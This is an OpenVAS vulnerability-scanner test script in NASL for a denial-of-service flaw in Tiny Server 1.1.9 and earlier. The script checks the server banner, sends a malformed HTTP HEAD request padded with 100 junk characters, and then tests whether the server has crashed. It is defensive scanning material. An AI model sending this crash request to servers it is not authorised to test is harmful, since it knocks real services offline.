###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_tiny_server_http_head_dos_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Tiny Server HTTP HEAD Request Remote Denial of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to cause the application
  to crash, creating a denial-of-service condition.
  Impact Level: Application";
tag_affected = "Tiny Server versions 1.1.9 and prior";
tag_insight = "The flaw is due to an error when processing HTTP HEAD requests and can
  be exploited to cause a denial of service via a specially crafted packet.";
tag_solution = "No solution or patch is available as of 22nd March, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://tinyserver.sourceforge.net";
tag_summary = "The host is running Tiny Server and is prone to denial of service
  vulnerability.";

if(description)
{
  script_id(902820);
  script_version("$Revision: 12 $");
  script_bugtraq_id(52635);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-03-22 12:12:12 +0530 (Thu, 22 Mar 2012)");
  script_name("Tiny Server HTTP HEAD Request Remote Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52635");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18629");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/111024/tinyserver119-dos.txt");

  script_description(desc);
  script_summary("Check if Tiny HTTP Server is vulnerable to denial of service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Denial of Service");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

## Variable Initialization
req = "";
res = "";
port = 0;
banner = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if(!banner || "Server: TinyServer" >!< banner){
  exit(0);
}

## Construct attack request
req = string("HEAD ", crap(100), "HTTP/1.0\r\n");

## Send crafted request
res = http_send_recv(port:port, data:req);
sleep(2);

## Confirm Tiny HTTP Server is dead
if(http_is_dead(port:port)){
  security_hole(port);
}
